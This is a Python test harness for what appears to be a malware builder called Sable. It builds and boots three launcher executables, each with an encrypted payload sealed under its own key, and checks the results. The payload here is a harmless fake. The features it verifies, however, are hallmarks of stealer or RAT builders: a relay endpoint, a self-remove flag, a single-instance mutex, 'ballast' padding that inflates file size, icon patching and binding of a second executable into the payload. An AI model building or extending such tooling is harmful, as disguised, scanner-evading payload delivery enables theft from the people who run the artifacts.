"""Launcher proof: one frozen exe boots three artifacts, each sealed with its own key.

Nothing here touches the real agent. The payload is a fake tree whose import block is
generated from what ``agent/`` actually imports, so a module missing from the frozen
bundle fails as an ImportError in the marker file rather than as a silent half-run. The
set is read out of the source rather than typed here: a hand-written list only ever
tests the list.

The third artifact carries an icon patched into the launcher's resources and a file
welded into the payload, so both build-time inputs are proven against the real one-file
image rather than against a synthetic PE.

Run it against a built launcher:

    python tools/probes/sable_launcher.py tools\\dist\\sable-launcher.exe
"""

from __future__ import annotations

import ast
import io
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from agent import loader  # noqa: E402
from core import forge, seal  # noqa: E402
from core.schema import RelayConfig, RunConfig, SourceConfig  # noqa: E402

results: list[tuple[str, bool, str]] = []

_OWN = {"agent", "core", "__future__"}


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, detail))
    # Printed as they happen: a harness that only reports at the end cannot say which
    # step hung, which is the one thing worth knowing when it does.
    print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}", flush=True)


def payload_imports() -> list[str]:
    """Top-level external modules the real ``agent/`` package imports at any level."""
    found: set[str] = set()

    for path in sorted((ROOT / "agent").rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    found.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                found.add(node.module.split(".")[0])

    return sorted(found - _OWN)


IMPORTS = payload_imports()

FAKE_ENTRY = '''
from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path

# Generated by tools/probes/sable_launcher.py from agent/'s own import statements.
IMPORTS = {imports!r}

for name in IMPORTS:
    __import__(name)

import base64
import hashlib
import re
import secrets
import sqlite3
import ssl
import urllib.error
import urllib.request


def main(argv=None) -> int:
    marker = os.environ.get("SABLE_PROOF_MARKER")
    if not marker:
        return 2

    with sqlite3.connect(":memory:") as db:
        db.execute("create table proof (value text)")
        db.execute("insert into proof values (?)", (hashlib.sha256(b"sable").hexdigest(),))
        value = db.execute("select value from proof").fetchone()[0]

    workspace = tempfile.mkdtemp(prefix="sable-proof-")
    record = {{
        "sqlite": value,
        "ssl": ssl.OPENSSL_VERSION.split()[0],
        "base64": base64.b64encode(b"ok").decode("ascii"),
        "regex": bool(re.match("^s", "sable")),
        "secret_bytes": len(secrets.token_hex(8)),
        "urllib": hasattr(urllib.request, "urlopen"),
        "urlerror": hasattr(urllib.error, "URLError"),
        "tempdir": bool(workspace),
        "archive_dir": str(Path(__file__).parent),
        "frozen": bool(getattr(sys, "frozen", False)),
        "imports": IMPORTS,
    }}
    Path(marker).write_text(json.dumps(record, indent=2), encoding="utf-8")
    return 0
'''.format(imports=IMPORTS)


def fake_root(work: Path) -> Path:
    """A payload tree that is real enough to import and harmless to run."""
    root = work / "fake"
    (root / "agent").mkdir(parents=True)
    (root / "core").mkdir(parents=True)

    (root / "agent" / "__init__.py").write_text("", encoding="utf-8")
    (root / "agent" / "entry.py").write_text(FAKE_ENTRY, encoding="utf-8")
    (root / "agent" / "loader.py").write_bytes((ROOT / "agent" / "loader.py").read_bytes())
    (root / "core" / "schema.py").write_bytes((ROOT / "core" / "schema.py").read_bytes())
    return root


def config(key: str, mutex: str, ballast: int = 0) -> RunConfig:
    return RunConfig(
        schema_version=1,
        mutex=mutex,
        seal_key=key,
        relay=RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        sources=SourceConfig(),
        self_remove=False,
        ballast_mb=ballast,
    )


def ico_file(target: Path) -> Path:
    """A two-image ``.ico``: a 16px and a 32px DIB, both solid, written to ``target``."""
    sizes = (16, 32)
    images: list[bytes] = []
    for size in sizes:
        header = struct.pack("<IiiHHIIiiII", 40, size, size * 2, 1, 32, 0, 0, 0, 0, 0, 0)
        pixels = bytes([0x40, 0x20, 0x10, 0xFF]) * (size * size)
        images.append(header + pixels + bytes(size * size // 8))

    table = b""
    offset = 6 + 16 * len(images)
    for size, image in zip(sizes, images, strict=True):
        table += struct.pack("<BBBBHHII", size, size, 0, 0, 1, 32, len(image), offset)
        offset += len(image)

    target.write_bytes(struct.pack("<HHH", 0, 1, len(images)) + table + b"".join(images))
    return target


def boot_once(artifact: Path, marker: Path, label: str) -> None:
    environment = dict(os.environ)
    environment["SABLE_PROOF_MARKER"] = str(marker)

    started = time.monotonic()
    try:
        completed = subprocess.run(
            [str(artifact)],
            env=environment,
            capture_output=True,
            timeout=120,
            check=False,
        )
    except subprocess.TimeoutExpired:
        check(f"{label}: exits", False, "timed out after 120 s")
        return
    except OSError as exc:
        check(f"{label}: exits", False, f"{type(exc).__name__}: {exc}")
        return

    seconds = time.monotonic() - started
    detail = completed.stderr.decode("utf-8", "replace").strip()[:400]
    check(f"{label}: exits 0", completed.returncode == 0, f"rc={completed.returncode} {detail}")
    check(f"{label}: under 30 s", seconds < 30.0, f"{seconds:.1f} s")

    if not marker.is_file():
        check(f"{label}: payload ran", False, "no marker written")
        return
    check(f"{label}: payload ran", True, "")

    record = json.loads(marker.read_text(encoding="utf-8"))
    check(f"{label}: sqlite", len(record.get("sqlite", "")) == 64, record.get("sqlite", ""))
    check(f"{label}: ssl", bool(record.get("ssl")), str(record.get("ssl")))
    check(f"{label}: base64", record.get("base64") == "b2s=", str(record.get("base64")))
    check(f"{label}: regex", record.get("regex") is True, "")
    check(f"{label}: secrets", record.get("secret_bytes") == 16, str(record.get("secret_bytes")))
    check(f"{label}: urllib", record.get("urllib") is True and record.get("urlerror") is True, "")
    check(f"{label}: tempdir", record.get("tempdir") is True, "")
    check(
        f"{label}: every payload import resolved",
        record.get("imports") == IMPORTS,
        ", ".join(IMPORTS),
    )
    check(f"{label}: imported from the archive", "payload.zip" in str(record.get("archive_dir", "")), str(record.get("archive_dir", "")))


def main(argv: list[str]) -> int:
    if len(argv) != 1:
        print("usage: sable_launcher.py <launcher.exe | launcher tree>")
        return 2

    launcher = Path(argv[0]).resolve()
    # A one-file freeze is a single exe. A one-directory freeze is a tree whose exe
    # cannot run without ``_internal`` beside it, so the tree is the launcher and the
    # artifact has to be built in the same shape. Both are proved by the same checks;
    # only the unit written and booted differs.
    if launcher.is_dir():
        shape = forge.OUTPUT_DIR
        tree: Path | None = launcher
        try:
            launcher_exe = forge.sole_exe(launcher)
        except forge.ForgeError as exc:
            print(f"FAIL  {launcher}: {exc}")
            return 2
    elif launcher.is_file():
        shape = forge.OUTPUT_EXE
        tree = None
        launcher_exe = launcher
    else:
        print(f"FAIL  {launcher}: not a file or a tree")
        return 2

    check(
        f"launcher exists ({shape})",
        launcher_exe.stat().st_size > 1_000_000,
        f"{launcher_exe.stat().st_size} bytes",
    )

    def artifact(name: str) -> Path:
        """Where this shape's output goes: a file for one-file, a folder for one-dir."""
        return work / name if shape == forge.OUTPUT_DIR else work / f"{name}.exe"

    def bootable(built: Path) -> Path:
        return forge.sole_exe(built) if built.is_dir() else built

    def make(name: str, cfg: RunConfig, sealed: bytes, **kwargs: object) -> Path:
        target = artifact(name)
        forge.build(
            cfg,
            sealed,
            target,
            mode=shape,
            stub=tree if shape == forge.OUTPUT_DIR else launcher_exe,
            **kwargs,  # type: ignore[arg-type]
        )
        return target

    with tempfile.TemporaryDirectory(prefix="sable-launcher-") as scratch:
        work = Path(scratch)
        root = fake_root(work)

        first_cfg = config("k-proof-one-2f9a", "Global\\SABLE_PROOF_ONE")
        first = make(
            "one",
            first_cfg,
            seal.seal(forge.payload(root, first_cfg), first_cfg.seal_key),
        )

        second_cfg = config("k-proof-two-7c41", "Global\\SABLE_PROOF_TWO", ballast=1)
        second = make(
            "two",
            second_cfg,
            seal.seal(forge.payload(root, second_cfg), second_cfg.seal_key),
        )

        first_exe = bootable(first)
        second_exe = bootable(second)

        check(
            "both artifacts use the same launcher",
            first_exe.read_bytes()[: launcher_exe.stat().st_size] == launcher_exe.read_bytes(),
            "",
        )
        check("ballast changes the size", second_exe.stat().st_size > first_exe.stat().st_size, "")

        boot_once(first_exe, work / "one.json", "first")
        boot_once(second_exe, work / "two.json", "second")

        # Third: an icon patched into the same launcher and a file welded into the
        # payload. The boot proves the resource patch left a runnable image; the footer
        # and the archive check prove the patch and the fuse both survived the seal.
        third_cfg = config("k-proof-three-1d0e", "Global\\SABLE_PROOF_THREE")
        bound = work / "bound-proof.exe"
        bound.write_bytes(b"MZ" + bytes(64))
        third = make(
            "three",
            third_cfg,
            seal.seal(forge.payload(root, third_cfg, fuse=bound), third_cfg.seal_key),
            icon=ico_file(work / "proof.ico"),
        )
        third_exe = bootable(third)

        baseline = forge.expected_offset(launcher_exe.stat().st_size, 0)
        offset = int.from_bytes(third_exe.read_bytes()[-forge.FOOTER_SIZE:], "little")
        check("icon rewrites the image", offset != baseline, f"{offset} vs {baseline}")
        check(
            "icon is in the resources",
            forge.group_payload(forge.icon_entries(work / "proof.ico")) in third_exe.read_bytes(),
            "",
        )

        packed = loader._open_sealed(
            loader._read_sealed(third_exe, offset), third_cfg.seal_key
        )
        with zipfile.ZipFile(io.BytesIO(packed)) as archive:
            check(
                "bound file survives the seal",
                "fused/bound-proof.exe" in archive.namelist(),
                "",
            )

        boot_once(third_exe, work / "three.json", "third")

        # The mutex is real: a second copy launched while the first still runs exits 0
        # without a marker of its own. Proven by exit code only, since both share it.
        boot_once(first_exe, work / "one-again.json", "rerun")

        # A launcher on its own is not an artifact and must refuse rather than hang.
        if shape == forge.OUTPUT_DIR:
            bare_tree = work / "bare"
            shutil.copytree(tree, bare_tree)  # type: ignore[arg-type]
            bare = forge.sole_exe(bare_tree)
        else:
            bare = work / "bare.exe"
            bare.write_bytes(launcher_exe.read_bytes())
        try:
            completed = subprocess.run([str(bare)], capture_output=True, timeout=120, check=False)
        except subprocess.TimeoutExpired:
            check("bare launcher refuses", False, "timed out")
        else:
            check("bare launcher refuses", completed.returncode != 0, f"rc={completed.returncode}")

    failed = [item for item in results if not item[1]]
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
